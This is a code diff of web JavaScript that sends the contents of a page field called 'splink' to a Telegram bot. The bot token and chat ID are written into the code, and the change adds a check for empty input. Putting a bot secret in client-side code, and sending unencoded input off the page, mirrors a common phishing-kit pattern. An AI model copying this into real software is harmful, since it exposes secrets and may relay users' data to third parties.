@@ -545,14 +545,13 @@ const sprandom=Math.floor(Math.random()*splinks.length)
 var sprandomLink=splinks[sprandom]
 
 //Speaking Gateway
-
 function sendData() {
-
+   
   const botApiToken = '6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk';
   const chatId = '6034570280';
   const input = document.getElementById('splink').value; 
-
   const url = `https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${chatId}&text=${input}+ Speaking`;
+  if(input){
 document.getElementById("transition").style.display="block"
   fetch(url)
     .then(response => {
@@ -564,6 +563,12 @@ document.getElementById("transition").style.display="block"
     .catch(error => {
       console.error(error);
     });
+  }
+  else{
+    document.getElementById('splink').style.borderColor="red";
+    document.getElementById('splink').style.borderWidth="2px";
+    document.getElementById('splink').style.borderStyle="2px";
+  }  
 } 
 
 
